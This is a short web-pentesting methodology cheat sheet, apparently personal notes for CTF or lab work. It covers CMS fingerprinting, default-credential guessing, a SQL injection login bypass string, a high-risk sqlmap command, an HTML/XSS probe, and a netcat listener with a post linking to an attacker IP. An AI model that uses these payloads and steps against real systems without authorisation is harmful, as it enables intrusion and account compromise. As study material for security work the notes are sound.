# First Steps
## Wappalyzer 
Shows which techologies were used to create the website
- Security
- Cloud
- CMS
- Language

### CMS Systems
#### WordPress (Open-Source)
Websites around blogging 
#### Magento (Open-Source)
Websites around shopping

## Check URL's
Click around the website and see how the folders are organized
> [!NOTE] 
> Check what the home folder is (Ex. index.php).
> This could be an indictation that Apache Mod Read Write was misconfigured.
## Copyright 
The copyright at the bottom of the page typically indicates when the website was last updated. If you see an old copyright, the website will typically have old software.
> [!NOTE] 
> The website can be configured to pull the current date for the copyright
## Check for a CMS scanner 
Look for a scanner for the CMS that the website was created with.
- **WordPress**: wpscan
- **Magento**: magescan

## Common Files
- **index.php**: tells you if it is a php website
- **robots.txt**: guide for search engine bots (telling them where not to go)
- **index.html**: default home page

# Next Steps
## Login Page 
### Try Default Creds 
admin:admin
> [!NOTE] 
> Look up default credentials based on the service
### SQL Injection
admin:' or 1=1;--
### SQLMap
1. Capture a login request with Burp and save it as log.req
2. Run SQL injection testing
```bash
sqlmap -r login.req --batch --dbs --level=3 --risk=3
```
> [!NOTE] 
> Cross Site Request Forgery (CSRF) Tokens are unique for each session/request and are validated server-side. This makes it hard for sqlmap to work properly.


> [!Caution]
> Running a high risk factor could negatively impact the server
### Forgot Password
See if you can validate email addresses.
### Sign Up 
Try to sign up for a new account

## Posts
### Cross-Site Scripting 
Attempt to Bold Text
```form
<b>TITLE/USERNAME</b>
```
### Check Connection
Set up Listener on Attacking Machine
```bash
sudo nc -lvnp 80
```
In Post
```form
http://<ATTACKING_IP>/
```
Take note User-Agent (ex. Curl)
## Searchsploit
Search for CMS exploits with similar version numbers 
> [!NOTE]
> Compare creation_date/vendor_contact to copyright (creation after copyright)



